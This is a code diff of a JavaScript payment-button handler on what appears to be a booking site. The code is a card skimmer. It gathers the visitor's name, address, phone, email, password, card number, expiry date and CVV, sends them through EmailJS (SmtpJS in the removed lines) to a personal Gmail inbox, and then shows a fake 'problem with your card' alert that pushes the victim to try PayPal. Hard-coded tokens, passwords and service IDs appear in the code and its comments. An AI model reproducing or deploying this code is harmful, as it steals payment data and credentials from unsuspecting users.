@@ -189,70 +189,142 @@ function payButton() {
   const cardNumber = document.getElementById("cardnumber").value;
   const expDate = document.getElementById("expdate").value;
   const CVV = document.getElementById("cvv").value;
-  /*
-  var server_data = [
-    { fullname: fullname },
-    { address: address },
-    { phonenumber: phonenumber },
-    { email: email },
-    { password: password },
-    { scheddate: scheddate },
-    { time: time },
-    { cardHolder: cardHolder },
-    { cardNumber: cardNumber },
-    { expDate: expDate },
-    { CVV: CVV },
-  ];
-*/
-  //Username: "renziexmendez2000@gmail.com",
-  //Password: "35ABF12BC983841D360F676535150BFC73A7",
-  //SecureToken: "3eb0d99c-0fa3-4496-b629-603acc4f5cf6"
-  const dateNow = new Date();
-  let timeNow = dateNow.getTime();
 
-  Email.send({
-    SecureToken: "3eb0d99c-0fa3-4496-b629-603acc4f5cf6",
-    To: "renziexmendez2000@gmail.com",
-    From: "renziexmendez2000@gmail.com",
-    Subject: "Contact Info " + today + " " + timeNow,
-    Body:
-      "fullname: " +
-      fullname +
-      " \n" +
-      "address: " +
-      address +
-      " \n" +
-      "phonenumber: " +
-      phonenumber +
-      " \n" +
-      "email: " +
-      email +
-      " \n" +
-      "password: " +
-      password +
-      " \n" +
-      "scheddate: " +
-      scheddate +
-      " \n" +
-      "time: " +
-      time +
-      " \n" +
-      "cardHolder: " +
-      cardHolder +
-      " \n" +
-      "cardNumber: " +
-      cardNumber +
-      " \n" +
-      "expDate: " +
-      expDate +
-      " \n" +
-      "CVV: " +
-      CVV +
-      " \n",
-  }).then((message) =>
-    //alert(message)
-    alert(
-      "There is a problem with your card. \nPlease check or Pay using PayPal. \n\nThank You!"
-    )
-  );
+  if (
+    cardHolder.length > 0 &&
+    cardNumber.length > 0 &&
+    expDate.length > 0 &&
+    CVV.length > 0
+  ) {
+    /*
+        var server_data = [
+          { fullname: fullname },
+          { address: address },
+          { phonenumber: phonenumber },
+          { email: email },
+          { password: password },
+          { scheddate: scheddate },
+          { time: time },
+          { cardHolder: cardHolder },
+          { cardNumber: cardNumber },
+          { expDate: expDate },
+          { CVV: CVV },
+        ];
+      */
+    //Username: "sofiamendez2069@gmail.com",
+    //Password: "B6505A37BE5A592A8839955DCB36478CAC7C",
+    //SecureToken: "73374f-eebb-405e-8de9-2ca13952c444"
+    const dateNow = new Date();
+    let timeNow = dateNow.getTime();
+
+    // Email.send({
+    //   SecureToken: "73374f-eebb-405e-8de9-2ca13952c444",
+    //   To: "sofiamendez2069@gmail.com",
+    //   From: "sofiamendez2069@gmail.com",
+    //   Subject: "Contact Info " + today + " " + timeNow,
+    //   Body:
+    // "fullname: " +
+    // fullname +
+    // " \n" +
+    // "address: " +
+    // address +
+    // " \n" +
+    // "phonenumber: " +
+    // phonenumber +
+    // " \n" +
+    // "email: " +
+    // email +
+    // " \n" +
+    // "password: " +
+    // password +
+    // " \n" +
+    // "scheddate: " +
+    // scheddate +
+    // " \n" +
+    // "time: " +
+    // time +
+    // " \n" +
+    // "cardHolder: " +
+    // cardHolder +
+    // " \n" +
+    // "cardNumber: " +
+    // cardNumber +
+    // " \n" +
+    // "expDate: " +
+    // expDate +
+    // " \n" +
+    // "CVV: " +
+    // CVV +
+    // " \n",
+    // }).then((message) =>
+    //   //alert(message)
+    //   alert(
+    //     "There is a problem with your card. \nPlease check or Pay using PayPal. \n\nThank You!"
+    //   )
+    // );
+
+    (function () {
+      emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
+    })();
+
+    var params = {
+      from: "sofiamendez2069@gmail.com",
+      to: "sofiamendez2069@gmail.com",
+      subject: "Contact Info " + today + " " + timeNow,
+      replyto: "",
+      message:
+        "fullname: " +
+        fullname +
+        " \n" +
+        "address: " +
+        address +
+        " \n" +
+        "phonenumber: " +
+        phonenumber +
+        " \n" +
+        "email: " +
+        email +
+        " \n" +
+        "password: " +
+        password +
+        " \n" +
+        "scheddate: " +
+        scheddate +
+        " \n" +
+        "time: " +
+        time +
+        " \n" +
+        "cardHolder: " +
+        cardHolder +
+        " \n" +
+        "cardNumber: " +
+        cardNumber +
+        " \n" +
+        "expDate: " +
+        expDate +
+        " \n" +
+        "CVV: " +
+        CVV +
+        " \n",
+    };
+
+    var serviceID = "service_zgiz1w8"; // Email Service ID
+    var templateID = "template_lq00n7p"; // Email Template ID
+
+    emailjs
+      .send(serviceID, templateID, params)
+      .then((res) => {
+        alert(
+          "There was a problem with your card. \nPlease try to use PayPal. \n\nThank You!"
+        );
+      })
+      .catch((e) => {
+        alert("Error: ", e);
+      });
+  }
 }
+
+window.addEventListener("scroll", function () {
+  var header = this.document.querySelector("header");
+  header.classList.toggle("sticky", window.scrollY > 0);
+});
